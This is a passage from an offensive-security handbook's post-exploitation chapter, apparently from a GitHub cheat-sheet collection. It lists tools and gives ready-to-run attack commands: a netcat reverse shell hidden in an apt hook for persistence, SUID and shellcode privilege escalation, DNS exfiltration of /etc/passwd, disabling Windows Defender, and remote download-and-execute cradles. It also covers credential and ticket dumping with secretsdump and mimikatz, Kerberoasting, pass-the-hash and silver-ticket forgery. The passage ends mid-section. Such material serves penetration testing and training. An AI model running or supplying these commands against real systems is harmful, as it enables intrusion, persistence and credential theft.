# Post Exploitation

## Table of Contents

- [Resources](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#Resources)
- [AppLocker](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#AppLocker)
- [C](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#C)
- [Credentials File](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#Credentials-File)
- [dd](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#dd)
- [DNS](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#DNS)
- [Evil-WinRM](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#Evil-WinRM)
- [gdbus](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#gdbus)
- [gem](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#gem)
- [gMSADumper](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#gMSADumper)
- [grep](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#grep)
- [gsocket](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#gsocket)
- [find](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#find)
- [Impacket](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#Impacket)
- [JAWS](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#JAWS)
- [Kerberos](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#Kerberos)
- [Krbrelayx](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#Krbrelayx)
- [LAPS](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#LAPS)
- [LDAP](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#LDAP)
- [LD_Preload](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#LD_Preload)
- [Linux](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#Linux)
- [Linux Wildcards](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#Linux-Wildcards)
- [logrotten](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#logrotten)
- [Lsass](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#Lsass)
- [Lua](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#Lua)
- [machinectl](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#machinectl)
- [Microsoft Windows](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#Microsoft-Windows)
- [Microsoft Windows Defender](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#Microsoft-Windows-Defender)
- [Path Variable Hijacking](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#Path-Variable-Hijacking)
- [plotting](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#plotting)
- [PowerSploit](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#PowerSploit)
- [PowerView](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#PowerView)
- [PRET](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#PRET)
- [pth-toolkit](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#pth-toolkit)
- [Python](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#Python)
- [pika](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#pika)
- [powercat](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#powercat)
- [pwncat](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#pwncat)
- [Rubeus](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#Rubeus)
- [RunasCs](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#RunasCs)
- [SeBackupPrivilege Privilege Escalation (diskshadow)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#SeBackupPrivilege-Privilege-Escalation-diskshadow)
- [Shell Upgrade](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#Shell-Upgrade)
- [Sherlock](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#Sherlock)
- [sudo](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#sudo)
- [sudoedit](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#sudoedit)
- [Time Stomping](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#Time-Stomping)
- [Universal Privilege Escalation and Persistence Printer](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#Universal-Privilege-Escalation-and-Persistence-Printer)
- [User Group Exploitation](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#User-Group-Exploitation)
- [VSS](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#VSS)
- [Whisker](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#Whisker)
- [Windows-Exploit-Suggester](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#Windows-Exploit-Suggester)
- [WDigest](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#WDigest)
- [writeDACL](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#writeDACL)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| pwncat | Post-Exploitation Platform | https://github.com/calebstewart/pwncat |
| dnsteal | This is a fake DNS server that allows you to stealthily extract files from a victim machine through DNS requests. | https://github.com/m57/dnsteal |
| EvilTree | A python3 remake of the classic "tree" command with the additional feature of searching for user provided keywords/regex in files, highlighting those that contain matches. | https://github.com/t3l3machus/eviltree |
| PEASS-ng | Privilege Escalation Awesome Scripts SUITE new generation | https://github.com/carlospolop/PEASS-ng |
| LinEnum | Privilege Escalation Enumeration | https://github.com/rebootuser/LinEnum |
| JAWS | JAWS is PowerShell script designed to help penetration testers (and CTFers) quickly identify potential privilege escalation vectors on Windows systems. | https://github.com/411Hall/JAWS |
| Watson | Watson is a .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities. | https://github.com/rasta-mouse/Watson |
| WESNG | WES-NG is a tool based on the output of Windows' systeminfo utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. | https://github.com/bitsadmin/wesng
| Sherlock | PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities. | https://github.com/rasta-mouse/Sherlock |
| WADComs | WADComs is an interactive cheat sheet, containing a curated list of offensive security tools and their respective commands, to be used against Windows/AD environments. | https://wadcoms.github.io |
| GTFOBins | GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems. | https://gtfobins.github.io |
| LOLBAS | The goal of the LOLBAS project is to document every binary, script, and library that can be used for Living Off The Land techniques. | https://lolbas-project.github.io |
| scavenger | scavenger is a multi-threaded post-exploitation scanning tool for scavenging systems, finding most frequently used files and folders as well as "interesting" files containing sensitive information. | https://github.com/SpiderLabs/scavenger |
| Seatbelt | Seatbelt is a C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives. | https://github.com/GhostPack/Seatbelt |
| lsassy | Python tool to remotely extract credentials on a set of hosts. | https://github.com/Hackndo/lsassy |
| PPLdump | Dump the memory of a PPL with a userland exploit | https://github.com/itm4n/PPLdump |
| nanodump | LSASS dumper | https://github.com/helpsystems/nanodump |
| LAPSDumper | Dumping LAPS from Python | https://github.com/n00py/LAPSDumper |
| Certipy | Tool for Active Directory Certificate Services enumeration and abuse | https://github.com/ly4k/Certipy |
| Whisker | Whisker is a C# tool for taking over Active Directory user and computer accounts by manipulating their msDS-KeyCredentialLink attribute, effectively adding "Shadow Credentials" to the target account. | https://github.com/eladshamir/Whisker |
| PyWhisker | Python version of the C# tool for "Shadow Credentials" attacks | https://github.com/ShutdownRepo/pywhisker |
| BloodyAD Framework | BloodyAD is an Active Directory Privilege Escalation Framework, it can be used manually using bloodyAD.py or automatically by combining pathgen.py and autobloody.py. | https://github.com/CravateRouge/bloodyAD |
| tickey | Tool to extract Kerberos tickets from Linux kernel keys. | https://github.com/TarlogicSecurity/tickey |
| Rubeus | Rubeus is a C# toolset for raw Kerberos interaction and abuses. | https://github.com/GhostPack/Rubeus |
| pth-toolkit | A modified version of the passing-the-hash tool collection https://code.google.com/p/passing-the-hash/ designed to be portable and work straight out of the box even on the most 'bare bones' systems. | https://github.com/byt3bl33d3r/pth-toolkit |
| Impacket | Impacket is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (e.g. SMB1-3 and MSRPC) the protocol implementation itself. | https://github.com/fortra/impacket |
| RunasCs | RunasCs - Csharp and open version of windows builtin runas.exe | https://github.com/antonioCoco/RunasCs |
| powercat | Netcat: The powershell version. | https://github.com/besimorhino/powercat |
| PowerUp | PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations. | https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 |
| Powermad | PowerShell MachineAccountQuota and DNS exploit tools | https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1 |
| PowerView | PowerView is a PowerShell tool to gain network situational awareness on Windows domains. | https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 |
| PowerSploit | PowerSploit is a collection of Microsoft PowerShell modules that can be used to aid penetration testers during all phases of an assessment. | https://github.com/PowerShellMafia/PowerSploit |
| PowerSharpPack | Many useful offensive CSharp Projects wraped into Powershell for easy usage. | https://github.com/S3cur3Th1sSh1t/PowerSharpPack |
| WinPwn | Automation for internal Windows Penetrationtest / AD-Security | https://github.com/S3cur3Th1sSh1t/WinPwn |
| SharpCollection | Nightly builds of common C# offensive tools, fresh from their respective master branches built and released in a CDI fashion using Azure DevOps release pipelines. | https://github.com/Flangvik/SharpCollection |
| static-binaries | This repo contains a bunch of statically-linked binaries of various tools, along with the Dockerfiles / other build scripts that can be used to build them. | https://github.com/andrew-d/static-binaries |
| RoquePotato | Just another Windows Local Privilege Escalation from Service Account to System. | https://github.com/antonioCoco/RoguePotato |
| GenericPotato | A modified version of SweetPotato by @EthicalChaos to support impersonating authentication over HTTP and/or named pipes. | https://github.com/micahvandeusen/GenericPotato |
| Juicy Potato | A sugared version of RottenPotatoNG, with a bit of juice, i.e. another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM | https://github.com/ohpe/juicy-potato |
| JuicyPotatoNG | Another Windows Local Privilege Escalation from Service Account to System | https://github.com/antonioCoco/JuicyPotatoNG |
| Rotten Potato | New version of RottenPotato as a C++ DLL and standalone C++ binary - no need for meterpreter or other tools. | https://github.com/breenmachine/RottenPotatoNG |
| Windows-privesc-check | Tries to find misconfigurations that could allow local unprivileged users to escalate privileges to other users or to access local apps (e.g. databases). | https://github.com/pentestmonkey/windows-privesc-check |
| Windows Privilege Escalation | Windows privlege escalation methodology | https://github.com/frizb/Windows-Privilege-Escalation |
| Windows Privilege Escalation Fundamentals | How-to Windows Privilege Escalation | https://www.fuzzysecurity.com/tutorials/16.html |
| Priv2Admin | Exploitation paths allowing you to (mis)use the Windows Privileges to elevate your rights within the OS. | https://github.com/gtworek/Priv2Admin |
| SeBackupPrivilege | Use SE_BACKUP_NAME/SeBackupPrivilege to access objects you shouldn't have access to. | https://github.com/giuliano108/SeBackupPrivilege |

## AppLocker

> https://github.com/api0cradle/UltimateAppLockerByPassList

### Bypass List (Windows 10 Build 1803)

```c
C:\Windows\Tasks
C:\Windows\Temp
C:\windows\tracing
C:\Windows\Registration\CRMLog
C:\Windows\System32\FxsTmp
C:\Windows\System32\com\dmp
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)
C:\Windows\SysWOW64\FxsTmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
```

## APT

```c
$ echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f"};' > /etc/apt/apt.conf.d/<FILE>
```

## Bash

### SUID Privilege Escalation

```c
$ cp /bin/bash .
$ chmod +s bash
$ bash -p
```

## C

### Shell

```c
#include <unistd.h>
#include <errno.h>

main( int argc, char ** argv, char ** envp )
{
	setuid(0);
	setgid(0);
	envp = 0;
	system ("/bin/bash", argv, envp);
return;
}

### Compiling
$ gcc -0 shell shell.c
```

## Credentials File

> https://twitter.com/NinjaParanoid/status/1516442028963659777?t=g7ed0vt6ER8nS75qd-g0sQ&s=09

> https://www.nirsoft.net/utils/credentials_file_view.html

```c
C:\ rundll32 keymgr.dll, KRShowKeyMgr
```

## dd

### Execute Shellcode

```c
$ dd of=/proc/$$/mem bs=1 seek=$(($(cut -d" " -f9</proc/$$/syscall))) if=<(base64 -d<<<utz+IUO+aRkSKL+t3uH+McCwqQ8F) conv=notrunc
```

## DNS

### Data Exfiltration

#### Extract /etc/passwd

```perl
$ perl -E 'qx^Cdig $_.$$.${\(rand)}.example.com^Cfor(unpack"H*",qx^?cat /etc/pas*^?)=~m^H(..)^Hgc'
```

^C, ^H, and ^? are the corresponding single ASCII values.

## Evil-WinRM

> https://github.com/Hackplayers/evil-winrm

```c
$ menu
[+] Bypass-4MSI    # Windows Defender Protection / Bypass
[+] Dll-Loader
[+] Donut-Loader
[+] Invoke-Binary
```

```c
$ sudo ruby /usr/local/bin/evil-winrm -i <RHOST> -u <USERNAME> -p <PASSWORD>
```

### Using Certificate and Private Key

```c
$ evil-winrm -i <RHOST> -c /PATH/TO/CERTIFICATE/<CERTIFICATE>.crt -k /PATH/TO/PRIVATE/KEY/<KEY>.key -p -u -S
```

### Deactivate Windows Defender

```c
$ Set-MpPreference -DisableRealtimeMonitoring $true
```

### PowerView.ps1

> https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1

```c
$ sudo ruby /usr/local/bin/evil-winrm -i compatibility -u administrator -p 'EverybodyWantsToWorkAtP.O.O.' -s .
```

```c
*Evil-WinRM* PS C:\Users\Public> menu
*Evil-WinRM* PS C:\Users\Public> Bypass-4MSI
*Evil-WinRM* PS C:\> Import-Module .\PowerView.ps1
*Evil-WinRM* PS C:\> $pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
*Evil-WinRM* PS C:\> $cred = New-Object System.Management.Automation.PSCredential('<TARGET_DOMAIN>\<USERNAME>', $pass)
*Evil-WinRM* PS C:\> Add-DomainGroupMember -Identity 'Domain Admins' -Members '<USERNAME>' -Credential $cred
```

### Check User

```c
*Evil-WinRM* PS C:\Users\Public> Get-DomainUser <USERNAME> -Credential $cred
```

### Code Execution

```c
*Evil-WinRM* PS C:\> Invoke-Command -Computer DC -Credential $cred -ScriptBlock { whoami; hostname }
```

### Find a File

```c
*Evil-WinRM* PS C:\> Invoke-Command -Computer DC -Credential $cred -ScriptBlock { gci -recurse C:\Users <FILE>.txt }
```

### Read a File

```c
*Evil-WinRM* PS C:\> Invoke-Command -Computer DC -Credential $cred -ScriptBlock { cat \path\to\file\<FILE>.txt }
```

### Remove a User from a Group

```c
*Evil-WinRM* PS C:\> Invoke-Command -Computer DC -Credential $cred -ScriptBlock { net group "Domain Admins" <USERNAME> /del }
```

## gdbus

### Privilege Escalation

> https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/

```c
$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/.ssh/authorized_keys /root/.ssh/authorized_keys true
```

## gem

```c
$ sudo gem open -e "/bin/sh -c /bin/sh" rdoc
```

## gMSADumper

> https://github.com/micahvandeusen/gMSADumper

```c
$ python3 gMSADumper.py -u <USERNAME> -p <PASSWORD> -d <TARGET_DOMAIN> -l dc.<TARGET_DOMAIN>
```

## grep

```c
$ grep -R db_passwd
$ grep -roiE "password.{20}"
$ grep -oiE "password.{20}" /etc/*.conf
$ grep -v "^[#;]" /PATH/TO/FILE | grep -v "^$"    // grep for passwords like "DBPassword:"
```

## gsocket

### Shell

```c
$ bash -c "$(curl -fsSL gsocket.io/x)"
```

## find

### Passwords

```c
$ find ./ -type f -exec grep --color=always -i -I 'password' {} \;
```

### Group Permissions

```c
$ find / -group <group> 2>/dev/null
```

### User specific Files

```c
$ find / -user <USERNAME> 2>/dev/null
$ find / -user <USERNAME> -ls 2>/dev/null
$ find / -user <USERNAME> 2>/dev/null | grep -v proc 2>/dev/null
$ find / -user <USERNAME> -ls 2>/dev/null | grep -v proc 2>/dev/null
```

### SUID and SGID Files

```c
$ find / -perm -4000 2>/dev/null
$ find / -perm -4000 2>/dev/null | xargs ls -la
$ find / -type f -user root -perm -4000 2>/dev/null
```

## Impacket

> https://github.com/fortra/impacket

```c
$ impacket-smbserver local . -smb2support
$ impacket-reg <TARGET_DOMAIN>/<USERNAME>:<PASSWORD:PASSWORD_HASH>@<RHOST> <ACTION> <ACTION>
$ impacket-services <TARGET_DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST> <ACTION>
$ impacket-netview <TARGET_DOMAIN>/<USERNAME> -targets /PATH/TO/FILE/<FILE>.txt -users /PATH/TO/FILE/<FILE>.txt
$ impacket-lookupsid <TARGET_DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
$ impacket-GetADUsers -all -dc-ip <RHOST> <TARGET_DOMAIN>/
$ impacket-getST <TARGET_DOMAIN>/<USERNAME>$  -spn WWW/<DOMAIN_CONTROLLER>.<TARGET_DOMAIN> -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate Administrator
$ impacket-rpcdump <TARGET_DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
$ impacket-samrdump <TARGET_DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
$ impacket-atexec -k -no-pass <TARGET_DOMAIN>/Administrator@<DOMAIN_CONTROLLER>.<TARGET_DOMAIN> 'type C:\PATH\TO\FILE\<FILE>'
```

### impacket-smbclient

```c
$ export KRB5CCNAME=<USERNAME>.ccache
$ impacket-smbclient <TARGET_DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
$ impacket-smbclient -k <TARGET_DOMAIN>/<USERNAME>@<RHOST>.<TARGET_DOMAIN> -no-pass
```

### impacket-getTGT

```c
$ impacket-getTGT <TARGET_DOMAIN>/<USERNAME>:<PASSWORD>
$ impacket-getTGT <TARGET_DOMAIN>/<USERNAME> -dc-ip <TARGET_DOMAIN> -hashes aad3b435b51404eeaad3b435b51404ee:7c662956a4a0486a80fbb2403c5a9c2c
```

### impacket-GetNPUsers

```c
$ impacket-GetNPUsers <TARGET_DOMAIN>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
$ impacket-GetNPUsers <TARGET_DOMAIN>/<USERNAME> -request -no-pass -dc-ip <RHOST>
$ impacket-GetNPUsers <TARGET_DOMAIN>/ -usersfile usernames.txt -format john -outputfile hashes
```

### impacket-getUserSPNs / GetUserSPNs.py

```c
$ export KRB5CCNAME=<USERNAME>.ccache
$ impacket-GetUserSPNs <TARGET_DOMAIN>/<USERNAME>:<PASSWORD> -k -dc-ip <RHOST>.<TARGET_DOMAIN> -no-pass -request
$ ./GetUserSPNs.py <TARGET_DOMAIN>/<USERNAME>:<PASSWORD> -k -dc-ip <RHOST>.<TARGET_DOMAIN> -no-pass -request
```

### impacket-secretsdump

```c
$ export KRB5CCNAME=<USERNAME>.ccache
$ impacket-secretsdump <TARGET_DOMAIN>/<USERNAME>@<RHOST>
$ impacket-secretsdump -k <TARGET_DOMAIN>/<USERNAME>@<RHOST>.<TARGET_DOMAIN> -no-pass -debug
$ impacket-secretsdump -ntds ndts.dit -system system -hashes lmhash:nthash LOCAL -output nt-hash
$ impacket-secretsdump -dc-ip <RHOST> <TARGET_DOMAIN>.LOCAL/svc_bes:<PASSWORD>@<RHOST>
$ impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
```

### impacket-psexec

```c
$ impacket-psexec <USERNAME>@<RHOST>
$ impacket-psexec <TARGET_DOMAIN>/administrator@<RHOST> -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
```

### impacket-ticketer

#### Requirements

* Valid User
* NTHASH
* Domain-SID

```c
$ export KRB5CCNAME=<USERNAME>.ccache
$ impacket-ticketer -nthash C1929E1263DDFF6A2BCC6E053E705F78 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain <TARGET_DOMAIN> -spn MSSQLSVC/<RHOST>.<TARGET_DOMAIN> -user-id 500 Administrator
```

#### Fixing [-] exceptions must derive from BaseException

##### Issue

```c
$ ./GetUserSPNs.py <TARGET_DOMAIN>/<USERNAME>:<PASSWORD> -k -dc-ip <DOMAIN_CONTROLLER>.<TARGET_DOMAIN> -no-pass -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] exceptions must derive from BaseException
```

#### To fix it:

```c
241         if self.__doKerberos:
242             #target = self.getMachineName()
243             target = self.__kdcHost
```

## JAWS

> https://github.com/411Hall/JAWS

```c
PS C:\> IEX(New-Object Net.webclient).downloadString('http://<LHOST>:<LPORT>/jaws-enum.ps1')
```

## Kerberos

> https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a

### Bruteforce

```c
$ ./kerbrute -domain <TARGET_DOMAIN> -users <FILE> -passwords <FILE> -outputfile <FILE>
```

#### With List of Users

```c
C:\> .\Rubeus.exe brute /users:<FILE> /passwords:<FILE> /domain:<TARGET_DOMAIN> /outfile:<FILE>
```

#### Check Passwords for all Users in Domain

```c
C:\> .\Rubeus.exe brute /passwords:<FILE> /outfile:<FILE>
```

### ASPREPRoast

#### Check ASPREPRoast for all Domain Users (Credentials required)

```c
$ impacket-GetNPUsers <TARGET_DOMAIN>/<USERNAME>:<PASSWORD> -request -format hashcat -outputfile <FILE>
$ impacket-GetNPUsers <TARGET_DOMAIN>/<USERNAME>:<PASSWORD> -request -format john -outputfile <FILE>
```

#### Check ASPREPRoast for a List of Users (No Credentials required)

```c
$ impacket-GetNPUsers <TARGET_DOMAIN>/ -usersfile <FILE> -format hashcat -outputfile <FILE>
$ impacket-GetNPUsers <TARGET_DOMAIN>/ -usersfile <FILE> -format john -outputfile <FILE>
```

#### Check ASPREPRoast for all Domain Users in Domain

```c
C:\> .\Rubeus.exe asreproast  /format:hashcat /outfile:<FILE>
```

#### Kerberoasting

```c
$ python GetUserSPNs.py <TARGET_DOMAIN>/<USERNAME>:<PASSWORD> -outputfile <FILE>
C:\> .\Rubeus.exe kerberoast /outfile:<FILE>
PS C:> iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
PS C:> Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII <FILE>
PS C:> Invoke-Kerberoast -OutputFormat john | % { $_.Hash } | Out-File -Encoding ASCII <FILE>
```

### Overpass The Hash/Pass The Key (PTK)

#### Request TGT with Hash

```c
$ impacket-getTGT <TARGET_DOMAIN>/<USERNAME> -hashes <LMHASH>:<NTLMHASH>
```

#### Request TGT with aesKey (More secure Encryption, probably more stealth due is it used by Default)

```c
$ impacket-getTGT <TARGET_DOMAIN>/<USERNAME> -aesKey <KEY>
```

#### Request TGT with Password

```c
$ impacket-getTGT <TARGET_DOMAIN>/<USERNAME>:<PASSWORD>
```

#### Set TGT for Impacket Usage

```c
$ export KRB5CCNAME=<USERNAME>.ccache
```

#### Execute Remote Commands

```c
$ impacket-psexec <TARGET_DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
$ impacket-smbexec <TARGET_DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
$ impacket-wmiexec <TARGET_DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
```

#### Ask and inject the Ticket

```c
C:\> .\Rubeus.exe asktgt /domain:<TARGET_DOMAIN> /user:<USERNAME> /rc4:<NTLMHASH> /ptt
```

#### Execute a CMD on Remote Host

```c
C:\> .\PsExec.exe -accepteula \\<RHOST> cmd
```

### Pass The Ticket (PTT)

#### Harvest Tickets from Linux

##### Check Type and Location of Tickets

```c
$ grep default_ccache_name /etc/krb5.conf
```

* If none return, default is FILE:/tmp/krb5cc_%{uid}
* In Case of File Tickets it is possible to Copy-Paste them to use them
* In Case of being KEYRING Tickets, the Tool tickey can be used to get them
* To dump User Tickets, if root, it is recommended to dump them all by injecting in other user processes
* To inject, the Ticket have to be copied in a reachable Folder by all Users

```c
$ cp tickey /tmp/tickey
$ /tmp/tickey -i
```

#### Harvest Tickets from Windows

```c
mimikatz # sekurlsa::tickets /export
$ .\Rubeus dump
```

#### Convert Tickets dumped with Rubeus into base64

```c
[IO.File]::WriteAllBytes("<TICKET>.kirbi", [Convert]::FromBase64String("<TICKET>"))
```

#### Convert Tickets between Linux and Windows Format with ticket_converter.py

> https://github.com/Zer1t0/ticket_converter

```c
$ python ticket_converter.py ticket.kirbi ticket.ccache
$ python ticket_converter.py ticket.ccache ticket.kirbi
```

#### Using Ticket on Linux

```c
$ export KRB5CCNAME=<USERNAME>.ccache
```

#### Execute Remote Commands by using TGT

```c
$ impacket-psexec <TARGET_DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
$ impacket-smbexec <TARGET_DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
$ impacket-wmiexec <TARGET_DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
```

#### Using Ticket on Windows

##### Inject Ticket with mimikatz

```c
mimikatz # kerberos::ptt <KIRBI_FILE>
```

##### Inject Ticket with Rubeus

```c
C:\> .\Rubeus.exe ptt /ticket:<KIRBI_FILE>
```

##### Execute a CMD on Remote Host

```c
C:\> .\PsExec.exe -accepteula \\<RHOST> cmd
```

### Silver Ticket

#### Impacket Examples

##### Generate TGS with NTLM

```c
$ python ticketer.py -nthash <NTLMHASH> -domain-sid <SID> -domain <TARGET_DOMAIN> -spn <SPN>  <USERNAME>
```

##### Generate TGS with aesKey

```c
$ python ticketer.py -aesKey <KEY> -domain-sid <SID> -domain <TARGET_DOMAIN> -spn <SPN>  <USERNAME>
```

##### Set the ticket for impacket use

```c
$ export KRB5CCNAME=<USERNAME>.ccache
```

##### Execute Remote Commands by using TGT

```c
$ impacket-psexec <TARGET_DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
$ impacket-smbexec <TARGET_DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
$ impacket-wmiexec <TARGET_DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
```

#### mimikatz Examples

##### Generate TGS with NTLM

```c
mimikatz # kerberos::golden /domain:<TARGET_DOMAIN>/sid:<SID> /rc4:<NTLMHASH> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
```

##### Generate TGS with AES 128bit Key

```c
mimikatz # kerberos::golden /domain:<TARGET_DOMAIN>/sid:<SID> /aes128:<KEY> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
```

##### Generate TGS with AES 256bit Key (More secure Encryption, probably more stealth due is it used by Default)

```c
